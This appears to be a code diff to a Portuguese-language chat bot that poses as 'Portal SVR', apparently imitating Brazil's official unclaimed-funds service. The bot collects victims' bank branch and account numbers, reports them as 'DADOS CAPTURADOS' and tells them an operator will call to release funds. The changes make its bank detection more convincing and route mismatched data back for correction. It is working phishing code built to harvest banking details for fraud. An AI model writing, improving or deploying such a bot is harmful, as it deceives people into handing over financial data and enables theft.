@@ -1023,6 +1023,7 @@ async function processIncomingMessage(msg, targetChatId) {
         }
     } else if (currentSession.step === 3) {
         const typedAg = text.trim().replace(/\D/g, "");
+
         if (typedAg.length >= 3 && typedAg.length <= 5) {
             currentSession.step = 4;
             currentSession.bankAg = typedAg;
@@ -1036,19 +1037,37 @@ async function processIncomingMessage(msg, targetChatId) {
         const typedCc = text.trim();
         const cleanCc = typedCc.replace(/\D/g, "");
         if (cleanCc.length >= 4) {
-            const bank = detectBank(typedCc + " " + (currentSession.bankAg || ""));
-            const bankName = bank ? bank.name : "Instituição Identificada";
-            const bankCode = bank ? bank.code : null;
-
-            if (bankCode) {
-                const validation = validateBankData(bankCode, currentSession.bankAg, typedCc);
-                if (!validation.valid) {
-                    await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\n${validation.error}\n\nPor favor, informe os dados corretos ou o número da agência novamente:`);
-                    currentSession.step = 3; // Volta para agência para garantir correção
-                    chatSessions.set(targetChatId, currentSession);
-                    saveSessions();
-                    return;
+            let detectedBank = null;
+            // Prioriza os bancos mais comuns na varredura para evitar "Planner Corretora" em tudo
+            const priorityBanks = ["104", "001", "341", "237", "033", "260", "077", "336"];
+            
+            // Varredura nos bancos prioritários
+            for (const code of priorityBanks) {
+                if (validateBankData(code, currentSession.bankAg, typedCc).valid) {
+                    detectedBank = { code, name: BANCOS_LIST[code] || "Banco do Brasil" };
+                    break;
                 }
+            }
+            
+            // Se não achar nos prioritários, varre a lista inteira
+            if (!detectedBank) {
+                for (const code of Object.keys(BANCOS_LIST)) {
+                    if (validateBankData(code, currentSession.bankAg, typedCc).valid) {
+                        detectedBank = { code, name: BANCOS_LIST[code] };
+                        break;
+                    }
+                }
+            }
+
+            const bankName = detectedBank ? detectedBank.name : "Instituição Identificada";
+            const bankCode = detectedBank ? detectedBank.code : null;
+
+            if (!bankCode) {
+                await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão de nenhuma instituição bancária reconhecida.\n\nPor favor, informe o número da agência novamente:`);
+                currentSession.step = 3; 
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+                return;
             }
 
             currentSession.step = 5;
@@ -1058,7 +1077,7 @@ async function processIncomingMessage(msg, targetChatId) {
             saveSessions();
 
             await sendBotMessage(targetChatId,
-                `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
+                `🏛️ *${bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
                 `📍 *DADOS CAPTURADOS:*\n` +
                 `- Agência: ${currentSession.bankAg}\n` +
                 `- Conta: ${currentSession.bankCc}\n` +
@@ -1117,7 +1136,7 @@ async function processIncomingMessage(msg, targetChatId) {
             await sendBotMessage(targetChatId,
                 `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
                 `Prezado(a) *${currentSession.name}*,\n` +
-                `Seu canal de comunicação (*${typedEmail}*) foi vinculado com sucesso ao processo de resgate.\n\n` +
+                `Seu canal de comunicação (${typedEmail}) foi vinculado com sucesso ao processo de resgate.\n\n` +
                 `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
                 `${frenteMsg}\n\n` +
                 `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
